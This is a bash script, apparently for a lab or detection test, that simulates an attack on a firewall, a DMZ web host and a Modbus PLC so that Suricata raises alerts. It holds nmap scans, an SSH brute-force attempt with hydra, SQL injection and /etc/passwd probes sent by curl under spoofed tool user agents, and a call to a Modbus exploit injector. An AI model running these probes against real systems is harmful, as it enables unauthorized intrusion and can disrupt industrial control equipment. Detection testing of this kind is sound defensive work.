#!/bin/bash
# ==============================================================================
# Kali Red Team Attack Simulation Script
# Target: OPNsense Next-Gen Firewall, DMZ Web Services, and OT/ICS Modbus SCADA
# ==============================================================================

TARGET_WAN="${1:-172.31.255.50}"
TARGET_DMZ="${2:-10.10.20.50}"
TARGET_OT_PLC="${3:-10.10.30.50}"

echo "======================================================================"
echo " [!] INITIATING ADVERSARY SIMULATION AGAINST PERIMETER & OT NETWORK"
echo " Target WAN Firewall : ${TARGET_WAN}"
echo " Target DMZ Host     : ${TARGET_DMZ}"
echo " Target OT PLC       : ${TARGET_OT_PLC}"
echo "======================================================================"

# Stage 1: SYN Stealth Port Reconnaissance (Triggers Suricata ET SCAN Nmap)
echo ""
echo "[Stage 1/5] Running TCP SYN Stealth Port Scan..."
nmap -sS -Pn -T4 -p 21,22,80,443,3389,8080 "${TARGET_WAN}" || true

# Stage 2: Service & OS Detection Fingerprinting
echo ""
echo "[Stage 2/5] Running Aggressive Service Fingerprinting..."
nmap -sV -O --version-intensity 5 "${TARGET_WAN}" -p 80,443 || true

# Stage 3: Simulated SSH Credential Stuffing / Brute-Force
echo ""
echo "[Stage 3/5] Launching Simulated SSH Brute-Force / Auth Anomaly..."
hydra -l root -p invalid_pass_test -t 4 "${TARGET_WAN}" ssh -s 22 2>&1 | head -n 10 || true

# Stage 4: Malicious Web Exploit & SQL Injection Probe
echo ""
echo "[Stage 4/5] Sending SQL Injection and Web Vulnerability Probes..."
curl -s -A "sqlmap/1.4.11#stable" "http://${TARGET_WAN}/index.php?id=1%20UNION%20SELECT%20null,username,password%20FROM%20users--" 2>/dev/null || true
curl -s -A "Nikto/2.1.6" "http://${TARGET_WAN}/etc/passwd" 2>/dev/null || true

# Stage 5: OT/ICS Modbus TCP Exploitation (MITRE ATT&CK for ICS T0855 / T0836)
echo ""
echo "[Stage 5/5] Launching Modbus TCP SCADA Protocol Injection..."
if [ -f "$(dirname "$0")/../scripts/modbus_exploit_injector.py" ]; then
    python3 "$(dirname "$0")/../scripts/modbus_exploit_injector.py" "${TARGET_OT_PLC}" 502 || true
else
    nmap --script modbus-discover -p 502 "${TARGET_OT_PLC}" || true
fi

echo ""
echo "======================================================================"
echo " [✓] Simulation Complete. Check Suricata / EveBox / OPNsense logs!"
echo "======================================================================"
